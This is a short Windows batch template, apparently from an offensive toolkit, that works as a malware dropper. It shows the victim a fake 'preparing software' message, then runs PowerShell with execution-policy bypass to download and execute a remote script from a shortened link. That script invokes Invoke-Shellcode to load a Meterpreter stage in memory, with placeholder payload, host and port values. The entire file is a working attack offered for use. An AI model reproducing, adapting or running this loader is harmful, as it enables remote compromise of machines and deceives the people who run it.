:: batch template | Author: r00t-3xp10it
:: Invoke-Shellcode -[no]enc load remote payload
:: the meterpreter 2ºstage will be download\executed in RAM
:: thanks to Invoke-Shellcode funtion by Matthew Graeber
:: Credits: https://goo.gl/DWztZS
:: ---
@echo off
echo [*] Please wait, preparing software ...
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/14bZZ0c');Invoke-Shellcode –Payload PaYl0 –Lhost Lh0St –Lport Lp0Rt –Force"
